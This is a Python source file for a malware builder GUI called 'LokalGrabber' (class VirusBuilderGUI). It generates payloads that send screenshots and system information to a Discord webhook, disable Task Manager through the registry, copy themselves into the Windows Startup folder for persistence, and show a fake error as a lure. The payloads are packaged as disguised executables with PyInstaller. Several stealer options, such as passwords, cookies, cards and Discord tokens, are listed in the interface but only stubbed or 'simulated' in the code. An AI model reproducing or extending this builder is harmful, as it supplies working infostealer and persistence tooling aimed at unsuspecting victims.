import tkinter as tk
import customtkinter as ctk
from tkinter import messagebox, filedialog
import os
import datetime
import subprocess
import sys
import requests
import json
import platform
import time

# --- Configure CustomTkinter appearance ---
ctk.set_appearance_mode("Dark")  # Themes: "Light", "Dark", "System"
ctk.set_default_color_theme("blue") # Set default theme to "blue" (built-in)

class VirusBuilderGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("LokalGrabber")
        self.geometry("800x800")
        self.resizable(False, False)

        # Configure grid for main window to center content if needed
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Main frame to hold all content
        self.main_frame = ctk.CTkFrame(self, fg_color="#202020", corner_radius=10)
        self.main_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")
        self.main_frame.grid_rowconfigure((0, 1, 2, 3, 4, 5, 6, 7), weight=0)
        self.main_frame.grid_columnconfigure((0, 1, 2), weight=1)

        # Store webhook URL as an instance variable
        self.webhook_url = ""
        self.selected_icon_path = None # Initialize icon path

        # --- Fake Error Configuration Attributes ---
        self.fake_error_title = "Error"
        self.fake_error_message = "An unexpected error occurred."
        self.fake_error_config_window = None # To hold reference to the config window


        # --- Header Section ---
        self.header_label = ctk.CTkLabel(self.main_frame, text="LokalGrabber Builder", font=ctk.CTkFont(size=32, weight="bold"), text_color="#1F6AA5")
        self.header_label.grid(row=0, column=0, columnspan=3, pady=(20, 5))

        self.sub_header_label = ctk.CTkLabel(self.main_frame, text="Configure your custom Python or EXE build.", font=ctk.CTkFont(size=14), text_color="gray")
        self.sub_header_label.grid(row=1, column=0, columnspan=3, pady=(0, 10))

        self.github_label = ctk.CTkLabel(self.main_frame, text="github.com/your-repo/LokalGrabber-Tools", font=ctk.CTkFont(size=16), text_color="gray")
        self.github_label.grid(row=2, column=0, columnspan=3, pady=(0, 20))

        # --- Webhook Input Section ---
        self.webhook_entry = ctk.CTkEntry(self.main_frame, placeholder_text="https://discord.com/api/webhooks/...", width=400, height=35,
                                           fg_color="#303030", border_width=2, text_color="white")
        self.webhook_entry.grid(row=3, column=0, columnspan=2, pady=(10, 20), padx=(80, 10), sticky="e")
        self.webhook_entry.bind("<KeyRelease>", self.update_webhook_url)


        self.test_webhook_button = ctk.CTkButton(self.main_frame, text="Test Webhook",
                                                  font=ctk.CTkFont(size=14, weight="bold"), width=120, height=35, command=self.test_webhook)
        self.test_webhook_button.grid(row=3, column=2, pady=(10, 20), padx=(10, 80), sticky="w")

        # --- Feature Checkbox Sections ---
        # Group 1
        self.feature_frame_1 = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.feature_frame_1.grid(row=4, column=0, padx=20, pady=10, sticky="n")
        self.checkbox_vars_group1 = self._create_checkbox_group(self.feature_frame_1, [
            "System Info", "Wallets Session Files", "Games Session Files",
            "Telegram Session Files", "Roblox Accounts", "Discord Accounts"
        ])

        # Group 2
        self.feature_frame_2 = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.feature_frame_2.grid(row=4, column=1, padx=20, pady=10, sticky="n")
        self.checkbox_vars_group2 = self._create_checkbox_group(self.feature_frame_2, [
            "Discord Injection", "Passwords", "Cookies",
            "Browse History", "Download History", "Cards"
        ])

        # Group 3
        self.feature_frame_3 = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.feature_frame_3.grid(row=4, column=2, padx=20, pady=10, sticky="n")
        self.checkbox_vars_group3 = self._create_checkbox_group(self.feature_frame_3, [
            "Extentions", "Interesting Files", "Webcam",
            "Screenshot"
        ])

        # --- Bottom Checkbox Sections (Control Features) ---
        # Group 4
        self.feature_frame_4 = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.feature_frame_4.grid(row=5, column=0, padx=20, pady=(20,10), sticky="n")
        self.checkbox_vars_group4 = self._create_checkbox_group(self.feature_frame_4, [
            "Block Key", "Block Mouse", "Block Task Manager", "Block AV Website"
        ])

        # Group 5
        self.feature_frame_5 = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.feature_frame_5.grid(row=5, column=1, padx=20, pady=(20,10), sticky="n")
        self.checkbox_vars_group5 = self._create_checkbox_group(self.feature_frame_5, [
            "Spam Open Program", "Spam Create File", "Shutdown", "Fake Error"
        ])

        # Group 6
        self.feature_frame_6 = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.feature_frame_6.grid(row=5, column=2, padx=20, pady=(20,10), sticky="n")
        self.checkbox_vars_group6 = self._create_checkbox_group(self.feature_frame_6, [
            "Anti VM & Debug", "Launch at Startup", "Restart Every 5min"
        ])

        # --- Footer Input Section (File Name, File Type, Select Icon) ---
        self.file_name_entry = ctk.CTkEntry(self.main_frame, placeholder_text="File Name", width=150, height=35,
                                            fg_color="#303030", border_color="gray", text_color="white")
        self.file_name_entry.grid(row=6, column=0, pady=(20, 10), padx=(20, 5), sticky="w")

        self.file_type_dropdown = ctk.CTkComboBox(self.main_frame, values=["Python (.py)", "Executable (.exe)"], width=200, height=35,
                                                   fg_color="#303030", border_color="gray", button_color="blue", button_hover_color="#0066cc",
                                                   dropdown_fg_color="#303030", dropdown_hover_color="#404040", text_color="white")
        self.file_type_dropdown.set("File Type (.py)")
        self.file_type_dropdown.grid(row=6, column=1, pady=(20, 10), padx=5, sticky="w")

        self.select_icon_button = ctk.CTkButton(self.main_frame, text="Select Icon",
                                                font=ctk.CTkFont(size=14, weight="bold"), width=120, height=35, command=self.select_icon)
        self.select_icon_button.grid(row=6, column=2, pady=(20, 10), padx=(5, 20), sticky="e")

        # --- Build Button ---
        self.build_button = ctk.CTkButton(self.main_frame, text="Build",
                                           font=ctk.CTkFont(size=20, weight="bold"), width=200, height=50, command=self.build_action)
        self.build_button.grid(row=7, column=0, columnspan=3, pady=(20, 20))

    def update_webhook_url(self, event=None):
        self.webhook_url = self.webhook_entry.get().strip()

    def _create_checkbox_group(self, parent_frame, options):
        checkbox_vars = {}
        for i, option in enumerate(options):
            var = ctk.StringVar(value="off")
            # WICHTIG: Verwende command=lambda opt=option, v=var: self.on_checkbox_change(opt, v.get())
            # Das stellt sicher, dass der aktuelle Wert der Checkbox übergeben wird.
            checkbox = ctk.CTkCheckBox(parent_frame, text=option, variable=var,
                                       onvalue="on", offvalue="off",
                                       text_color="white",
                                       command=lambda opt=option, v=var: self.on_checkbox_change(opt, v.get()))
            checkbox.grid(row=i, column=0, sticky="w", pady=5, padx=5)
            checkbox_vars[option] = var
        return checkbox_vars

    def send_webhook_message(self, message: str, embeds: list = None):
        if not self.webhook_url:
            print("Webhook URL not configured. Cannot send message.")
            return

        payload = {}
        if message:
            payload["content"] = message
        if embeds:
            payload["embeds"] = embeds

        try:
            response = requests.post(self.webhook_url, json=payload, timeout=5)
            response.raise_for_status()
            print(f"Sent webhook message: {message[:50]}..." if message else "Sent webhook embed.")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send webhook message: {e}")

    def on_checkbox_change(self, feature_name: str, state: str):
        print(f"Checkbox '{feature_name}' changed to: {state}")
        self.update_webhook_url() # Stelle sicher, dass die Webhook URL aktuell ist.

        # Besondere Behandlung für "Fake Error"
        if feature_name == "Fake Error":
            if state == "on":
                # Versuche, das Konfigurationsfenster zu öffnen.
                self.open_fake_error_config()
                self.send_webhook_message(f"✅ Feature '{feature_name}' ENABLED on Builder.")
            else: # state is "off"
                self.send_webhook_message(f"❌ Feature '{feature_name}' DISABLED on Builder.")
                # Wenn der Fake Error ausgeschaltet wird, schließe das Konfigurationsfenster, falls offen.
                if self.fake_error_config_window and self.fake_error_config_window.winfo_exists():
                    self.fake_error_config_window.destroy()
                    self.fake_error_config_window = None # Referenz entfernen

            # Für "Fake Error" ist die Webhook-URL nicht zwingend, um das Konfigurationsfenster zu öffnen.
            # Daher überspringen wir die Webhook-Überprüfung, die andere Features blockieren würde.
            return

        # Allgemeine Webhook-Überprüfung für andere Features
        if not self.webhook_url and state == "on":
            messagebox.showwarning("Action Blocked", "Please enter a Webhook URL first before enabling features that send data.")
            # Optional: Setze die Checkbox wieder auf "off", wenn keine Webhook-URL vorhanden ist.
            # Dies ist komplexer, da wir die spezifische StringVar des Checkbox-Widgets benötigen.
            # Aktuell wird die Warnung angezeigt, aber der Zustand der Checkbox bleibt.
            return

        if state == "on":
             self.send_webhook_message(f"✅ Feature '{feature_name}' ENABLED on Builder.")
        elif state == "off":
            self.send_webhook_message(f"❌ Feature '{feature_name}' DISABLED on Builder.")

    def open_fake_error_config(self):
        # Nur ein Fenster gleichzeitig öffnen
        if self.fake_error_config_window is None or not self.fake_error_config_window.winfo_exists():
            self.fake_error_config_window = ctk.CTkToplevel(self)
            self.fake_error_config_window.title("Configure Fake Error")
            self.fake_error_config_window.geometry("400x250")
            self.fake_error_config_window.transient(self) # Macht das TopLevel-Fenster zum Kindfenster der Haupt-GUI
            self.fake_error_config_window.grab_set() # Blockiert Interaktionen mit dem Hauptfenster

            # Zentriere das Fenster über der Haupt-GUI
            self.fake_error_config_window.update_idletasks()
            main_x = self.winfo_x()
            main_y = self.winfo_y()
            main_width = self.winfo_width()
            main_height = self.winfo_height()

            toplevel_width = self.fake_error_config_window.winfo_width()
            toplevel_height = self.fake_error_config_window.winfo_height()

            x = main_x + (main_width // 2) - (toplevel_width // 2)
            y = main_y + (main_height // 2) - (toplevel_height // 2)

            self.fake_error_config_window.geometry(f"+{x}+{y}")


            self.fake_error_config_window.grid_columnconfigure(0, weight=1)
            self.fake_error_config_window.grid_columnconfigure(1, weight=3)

            # Title input
            title_label = ctk.CTkLabel(self.fake_error_config_window, text="Error Title:")
            title_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
            self.fake_error_title_entry = ctk.CTkEntry(self.fake_error_config_window, width=250)
            self.fake_error_title_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
            self.fake_error_title_entry.insert(0, self.fake_error_title) # Set current value

            # Message input
            message_label = ctk.CTkLabel(self.fake_error_config_window, text="Error Message:")
            message_label.grid(row=1, column=0, padx=10, pady=10, sticky="nw")
            self.fake_error_message_entry = ctk.CTkTextbox(self.fake_error_config_window, width=250, height=80)
            self.fake_error_message_entry.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
            self.fake_error_message_entry.insert("0.0", self.fake_error_message) # Set current value

            # Save Button
            save_button = ctk.CTkButton(self.fake_error_config_window, text="Save Configuration",
                                        command=self.save_fake_error_config)
            save_button.grid(row=2, column=0, columnspan=2, pady=15)

            # Beim Schließen des Fensters durch den Benutzer
            self.fake_error_config_window.protocol("WM_DELETE_WINDOW", self.on_fake_error_config_close)
        else:
            self.fake_error_config_window.focus_force() # Bring to front if already open

    def save_fake_error_config(self):
        self.fake_error_title = self.fake_error_title_entry.get().strip()
        self.fake_error_message = self.fake_error_message_entry.get("0.0", "end").strip()
        if not self.fake_error_title:
            self.fake_error_title = "Error" # Default if empty
        if not self.fake_error_message:
            self.fake_error_message = "An unexpected error occurred." # Default if empty

        messagebox.showinfo("Fake Error Config", "Fake Error configuration saved!")
        self.on_fake_error_config_close() # Schließt das Fenster und gibt den Fokus frei

    def on_fake_error_config_close(self):
        # Gibt den Fokus frei und zerstört das Fenster
        if self.fake_error_config_window:
            self.fake_error_config_window.grab_release()
            self.fake_error_config_window.destroy()
            self.fake_error_config_window = None # Referenz entfernen


    def test_webhook(self):
        self.update_webhook_url()
        if self.webhook_url:
            try:
                payload = {"content": "📢 Test message from LokalSending Builder! Webhook is working."}
                response = requests.post(self.webhook_url, json=payload, timeout=5)
                response.raise_for_status()
                messagebox.showinfo("Test Webhook", "Test message sent successfully!")
            except requests.exceptions.RequestException as e:
                messagebox.showerror("Test Webhook Failed", f"Failed to send test message: {e}\nPlease check the URL.")
        else:
            messagebox.showwarning("Test Webhook", "Please enter a Webhook URL first.")

    def select_icon(self):
        icon_path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico")]
        )
        if icon_path:
            messagebox.showinfo("Icon Selected", f"Selected icon: {os.path.basename(icon_path)}")
            self.selected_icon_path = icon_path
        else:
            self.selected_icon_path = None
            messagebox.showinfo("Icon Selection", "No icon selected.")


    def build_action(self):
        file_name = self.file_name_entry.get().strip()
        file_type_selection = self.file_type_dropdown.get()
        self.update_webhook_url()

        output_ext = ""
        selected_features = []
        output_dir = ""

        if not file_name:
            messagebox.showerror("Build Error", "Please enter a File Name.")
            return

        if not self.webhook_url:
            messagebox.showerror("Build Error", "Please enter a Webhook URL.")
            return

        if "Python" in file_type_selection:
            output_ext = ".py"
        elif "Executable" in file_type_selection:
            output_ext = ".exe"
        else:
            messagebox.showerror("Build Error", "Invalid File Type selected.")
            return

        all_checkbox_groups = [self.checkbox_vars_group1, self.checkbox_vars_group2, self.checkbox_vars_group3,
                               self.checkbox_vars_group4, self.checkbox_vars_group5, self.checkbox_vars_group6]
        for group in all_checkbox_groups:
            for feature, var in group.items():
                if var.get() == "on":
                    selected_features.append(feature)

        output_dir = filedialog.askdirectory(title="Select Output Directory")
        if not output_dir:
            messagebox.showwarning("Build Cancelled", "No output directory selected. Build cancelled.")
            return

        final_output_filename = f"{file_name}{output_ext}"
        temp_py_file_path = os.path.join(output_dir, f"{file_name}_temp.py")

        try:
            generated_script_content = self._generate_python_script(
                self.webhook_url,
                selected_features,
                self.fake_error_title,
                self.fake_error_message
            )

            with open(temp_py_file_path, "w", encoding='utf-8') as f:
                f.write(generated_script_content)

            build_success = False
            build_message = ""
            if output_ext == ".exe":
                messagebox.showinfo("Build Progress", f"Generating {file_name}.exe using PyInstaller...")
                pyinstaller_command = [
                    "pyinstaller", "--noconfirm", "--onefile", "--windowed",
                    f"--name={file_name}", f"--distpath={output_dir}"
                ]
                if hasattr(self, 'selected_icon_path') and self.selected_icon_path:
                    pyinstaller_command.append(f"--icon=\"{self.selected_icon_path}\"")

                pyinstaller_command.append(temp_py_file_path)

                print(f"Running PyInstaller command: {' '.join(pyinstaller_command)}")
                process = subprocess.run(pyinstaller_command, capture_output=True, text=True, check=False)

                if process.returncode == 0:
                    build_success = True
                    build_message = f"Successfully created {final_output_filename} in {output_dir}"
                    messagebox.showinfo("Build Success", build_message)
                else:
                    build_success = False
                    build_message = f"PyInstaller failed to build the executable.\nError:\n{process.stderr}\nOutput:\n{process.stdout}"
                    messagebox.showerror("Build Failed", build_message)
            elif output_ext == ".py":
                final_py_path = os.path.join(output_dir, final_output_filename)
                os.rename(temp_py_file_path, final_py_path)
                build_success = True
                build_message = f"Successfully created {final_output_filename} in {output_dir}"
                messagebox.showinfo("Build Success", build_message)

            self._send_build_notification(file_name, output_ext, self.webhook_url, selected_features, build_success, build_message, output_dir)

        except FileNotFoundError:
            messagebox.showerror("Build Error", "PyInstaller not found. Please install it: pip install pyinstaller")
            self._send_build_notification(file_name, output_ext, self.webhook_url, selected_features, False, "PyInstaller not found error.", output_dir)
        except Exception as e:
            messagebox.showerror("Build Error", f"An unexpected error occurred during build: {e}")
            self._send_build_notification(file_name, output_ext, self.webhook_url, selected_features, False, f"Unexpected error: {e}", output_dir)
        finally:
            pyinstaller_temp_dir = os.path.dirname(temp_py_file_path)

            if os.path.exists(temp_py_file_path):
                os.remove(temp_py_file_path)

            spec_file = os.path.join(pyinstaller_temp_dir, f"{file_name}.spec")
            if os.path.exists(spec_file):
                os.remove(spec_file)

            build_folder = os.path.join(pyinstaller_temp_dir, "build")
            if os.path.exists(build_folder):
                import shutil
                shutil.rmtree(build_folder, ignore_errors=True)

    def _send_build_notification(self, file_name: str, file_type: str, webhook_url: str,
                                 selected_features: list, success: bool, details: str, output_dir: str):
        color = 0x00FF00 if success else 0xFF0000
        status_emoji = "✅" if success else "❌"
        status_text = "SUCCESS" if success else "FAILED"

        embed = {
            "title": f"{status_emoji} Build Notification: {file_name}{file_type} - {status_text}",
            "description": f"Build attempted on **{os.environ.get('COMPUTERNAME', 'Unknown PC')}**.",
            "color": color,
            "fields": [
                {"name": "Name", "value": file_name, "inline": True},
                {"name": "Type", "value": file_type.replace("Executable (.exe)", ".exe").replace("Python (.py)", ".py"), "inline": True},
                {"name": "Webhook", "value": f"[`{webhook_url[:50]}...`](<{webhook_url}>)", "inline": False},
                {"name": "Output Directory", "value": f"`{output_dir}`", "inline": False},
                {"name": "Status Details", "value": f"```ansi\n{details}\n```" if not success else "Build completed successfully!", "inline": False}
            ],
            "footer": {"text": f"LokalSending Builder | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
        }

        stealer_features = [
            "System Info", "Wallets Session Files", "Games Session Files",
            "Telegram Session Files", "Roblox Accounts", "Discord Accounts",
            "Discord Injection", "Passwords", "Cookies",
            "Browse History", "Download History", "Cards",
            "Extentions", "Interesting Files", "Webcam", "Screenshot"
        ]
        malware_features = [
            "Block Key", "Block Mouse", "Block Task Manager", "Block AV Website",
            "Spam Open Program", "Spam Create File", "Shutdown", "Fake Error",
            "Anti VM & Debug", "Launch at Startup", "Restart Every 5min"
        ]

        enabled_stealer = [f for f in selected_features if f in stealer_features]
        enabled_malware = [f for f in selected_features if f in malware_features]

        if enabled_stealer:
            embed["fields"].append({"name": "Virus Created (Stealer)", "value": "\n".join([f"• {f}" for f in enabled_stealer]), "inline": False})
        else:
            embed["fields"].append({"name": "Virus Created (Stealer)", "value": "None enabled", "inline": False})

        if enabled_malware:
            embed["fields"].append({"name": "Virus Created (Malware)", "value": "\n".join([f"• {f}" for f in enabled_malware]), "inline": False})
        else:
            embed["fields"].append({"name": "Virus Created (Malware)", "value": "None enabled", "inline": False})


        self.send_webhook_message(message="", embeds=[embed])


    def _generate_python_script(self, webhook_url, selected_features, fake_error_title, fake_error_message):
        """Generates the Python script content based on selected features."""
        script_parts = [
            "# --- Generated by LokalSending Builder ---",
            "import requests",
            "import os",
            "import datetime",
            "import json",
            "import subprocess",
            "import sys",
            "import platform",
            "import time",
            "import tkinter as tk # Needed for messagebox",
            "from tkinter import messagebox # Needed for messagebox",
            "from PIL import ImageGrab # For screenshot functionality (pip install Pillow)",
            "",
            f"WEBHOOK_URL = \"{webhook_url}\"",
            "COMPUTER_NAME = os.environ.get('COMPUTERNAME', 'Unknown PC')",
            "",
            "def send_data_to_webhook(payload=None, files=None):",
            "    try:",
            "        response = requests.post(WEBHOOK_URL, json=payload, files=files, timeout=10)",
            "        response.raise_for_status()",
            "        print('Data sent successfully!')",
            "    except requests.exceptions.RequestException as e:",
            "        print(f'Error sending data: {e}')",
            "",
        ]

        if "Screenshot" in selected_features:
            script_parts.extend([
                "def take_screenshot_and_send():",
                "    try:",
                "        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')",
                "        screenshot_filename = f'Screenshot_{timestamp}.png'",
                "        temp_dir = os.environ.get('TEMP')",
                "        if not temp_dir:",
                "            print('TEMP environment variable not found for screenshot.')",
                "            return",
                "        screenshot_path = os.path.join(temp_dir, screenshot_filename)",
                "        screenshot = ImageGrab.grab()",
                "        screenshot.save(screenshot_path)",
                "        print(f'Screenshot saved: {screenshot_path}')",
                "",
                "        payload = {",
                "            'content': f'📸 New screenshot from {COMPUTER_NAME} at {datetime.datetime.now().strftime(\"%H:%M:%S\")}'",
                "        }",
                "        with open(screenshot_path, 'rb') as f:",
                "            files = {",
                "                'file': (screenshot_filename, f, 'image/png'),",
                "                'payload_json': (None, json.dumps(payload), 'application/json')",
                "            }",
                "            send_data_to_webhook(files=files)",
                "    except Exception as e:",
                "        print(f'Screenshot error: {e}')",
                "    finally:",
                "        if 'screenshot_path' in locals() and os.path.exists(screenshot_path):",
                "            os.remove(screenshot_path)",
                "",
            ])

        for feature in selected_features:
            if feature == "System Info":
                script_parts.extend([
                    "def get_system_info_and_send():",
                    "    info = f'🖥️ System Info from {COMPUTER_NAME}:\\n'",
                    "    info += f'OS: {platform.system()} {platform.release()}\\n'",
                    "    info += f'Architecture: {platform.machine()}\\n'",
                    "    info += f'Processor: {platform.processor()}\\n'",
                    "    send_data_to_webhook({'content': info})",
                    "",
                ])
            elif feature == "Discord Accounts":
                script_parts.extend([
                    "def collect_discord_accounts():",
                    "    print('Simulating Discord account collection...')",
                    "    simulated_token = f'mfa.SimulatedDiscordToken_{os.urandom(10).hex()}'",
                    "    simulated_path = f'C:\\\\Users\\\\User\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb\\\\000003.log'",
                    "    send_data_to_webhook({'content': f'🔓 **Simulated Discord Token Found:**\\nPath: `{simulated_path}`\\nToken: `{simulated_token}`'})",
                    "",
                ])
            elif feature == "Block Task Manager":
                script_parts.extend([
                    "def block_task_manager():",
                    "    try:",
                    "        if platform.system() == 'Windows':",
                    "            subprocess.run(['reg', 'add', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'], check=True, creationflags=subprocess.DETACHED_PROCESS)",
                    "            send_data_to_webhook({'content': f'🚫 Attempted to block Task Manager on {COMPUTER_NAME}'})",
                    "        else:",
                    "            send_data_to_webhook({'content': f'🚫 Task Manager block skipped (not Windows) on {COMPUTER_NAME}'})",
                    "    except Exception as e:",
                    "        send_data_to_webhook({'content': f'🚨 Failed to block Task Manager on {COMPUTER_NAME}: {e}'})",
                    "",
                ])
            elif feature == "Launch at Startup":
                script_parts.extend([
                    "def add_to_startup():",
                    "    try:",
                    "        if platform.system() == 'Windows':",
                    "            script_path = os.path.abspath(sys.argv[0])",
                    "            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')",
                    "            destination_path = os.path.join(startup_folder, os.path.basename(script_path))",
                    "            ",
                    "            if not os.path.exists(destination_path):",
                    "                import shutil",
                    "                shutil.copy2(script_path, destination_path)",
                    "                send_data_to_webhook({'content': f'🚀 Added to startup folder on {COMPUTER_NAME}'})",
                    "            else:",
                    "                print('Script already in startup folder.')",
                    "        else:",
                    "            send_data_to_webhook({'content': f'🚀 Startup addition skipped (not Windows) on {COMPUTER_NAME}'})",
                    "    except Exception as e:",
                    "        send_data_to_webhook({'content': f'🚨 Failed to add to startup on {COMPUTER_NAME}: {e}'})",
                    "",
                ])
            elif feature == "Restart Every 5min":
                script_parts.extend([
                    "def restart_loop():",
                    "    while True:",
                    "        send_data_to_webhook({'content': f'🔄 Restarting process on {COMPUTER_NAME} in 5 minutes... (Simulated)'})",
                    "        time.sleep(300) # Sleep for 5 minutes (300 seconds)",
                    "        print('Simulating restart...')",
                    "",
                ])
            elif feature == "Fake Error":
                # Ensure the title and message are properly escaped for string literals in Python
                # Using json.dumps for robust string escaping, even for special characters.
                escaped_title = json.dumps(fake_error_title)
                escaped_message = json.dumps(fake_error_message)

                script_parts.extend([
                    "def show_fake_error():",
                    "    try:",
                    "        # Erstelle ein Root-Fenster, um messagebox zu initialisieren, aber verstecke es sofort",
                    "        root = tk.Tk()",
                    "        root.withdraw() ",
                    f"        messagebox.showerror(title={escaped_title}, message={escaped_message})",
                    "        # Schließe das Root-Fenster nach dem Anzeigen des Fehlers",
                    "        root.destroy()",
                    f"        send_data_to_webhook({{'content': f'⚠️ Fake Error displayed on {{COMPUTER_NAME}}: Title={escaped_title}, Message={escaped_message}'}})",
                    "    except Exception as e:",
                    "        print(f'Error showing fake error: {e}')",
                    "        # Versuche, den Fehler an den Webhook zu senden, selbst wenn der Fake Error nicht angezeigt werden konnte",
                    "        send_data_to_webhook({'content': f'🚨 Failed to display Fake Error on {COMPUTER_NAME}: {e}'})",
                    "",
                ])
            else:
                formatted_feature_name = feature.lower().replace(' ', '_').replace('.', '')
                script_parts.append(f"def do_{formatted_feature_name}():")
                script_parts.append(f"    print(f'Executing \"{feature}\" action...')")
                script_parts.append(f"    send_data_to_webhook({{'content': f\"ℹ️ '{feature}' action executed on {{COMPUTER_NAME}}\"}})")
                script_parts.append("")


        # Main execution block for the generated script
        script_parts.append("if __name__ == '__main__':")
        script_parts.append("    print('LokalSending script started.')")
        script_parts.append("    # --- Execute selected features ---")

        has_continuous_feature = "Restart Every 5min" in selected_features

        for feature in selected_features:
            formatted_feature_name = feature.lower().replace(' ', '_').replace('.', '')
            if feature == "Screenshot":
                script_parts.append("    take_screenshot_and_send()")
            elif feature == "System Info":
                script_parts.append("    get_system_info_and_send()")
            elif feature == "Discord Accounts":
                script_parts.append("    collect_discord_accounts()")
            elif feature == "Block Task Manager":
                script_parts.append("    block_task_manager()")
            elif feature == "Launch at Startup":
                script_parts.append("    add_to_startup()")
            elif feature == "Restart Every 5min":
                script_parts.append("    # This feature will run in a loop, so it should be the last action if a loop is desired.")
                script_parts.append("    restart_loop()")
            elif feature == "Fake Error":
                script_parts.append("    show_fake_error()") # Call the new function
            else:
                script_parts.append(f"    do_{formatted_feature_name}()")

        if not has_continuous_feature:
            script_parts.append("    print('LokalSending script finished executing selected one-time actions.')")
        else:
            script_parts.append("    print('LokalSending script running continuous actions (e.g., Restart Every 5min).')")


        return "\n".join(script_parts)

if __name__ == "__main__":
    app = VirusBuilderGUI()
    app.mainloop()